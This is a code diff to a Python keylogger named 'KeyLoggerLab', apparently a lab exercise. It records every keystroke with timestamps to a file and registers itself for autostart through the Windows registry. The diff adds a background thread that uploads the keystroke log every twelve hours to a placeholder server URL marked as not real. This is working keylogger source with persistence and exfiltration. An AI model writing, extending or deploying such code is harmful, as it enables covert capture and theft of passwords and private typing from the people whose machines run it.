@@ -3,7 +3,20 @@ import keyboard
 from datetime import datetime
 import winreg
 import os
+import requests
+import time
+import threading
 
+def fileUpload():
+  while True:
+
+    with open("output.txt","rb") as f:
+        requests.post(
+            "https://yourserver/upload", ## NOT A REAL SERVER
+            files={"file": f}
+        )
+
+    time.sleep(43200)
 
 def add_to_autostart():
     app_name = "KeyLoggerLab"
@@ -41,8 +54,12 @@ def KeyLog(event):
      datei = open("output.txt", "a")
      datei.write(timestamp + "-" + pressed_key +"\r\n" )
      datei.close()
+     
 
+consentAutostart()
+upload_thread = threading.Thread(target=fileUpload, daemon=True)
+upload_thread.start()
 keyboard.hook(KeyLog)
 keyboard.wait()
 
-consentAutostart()
+
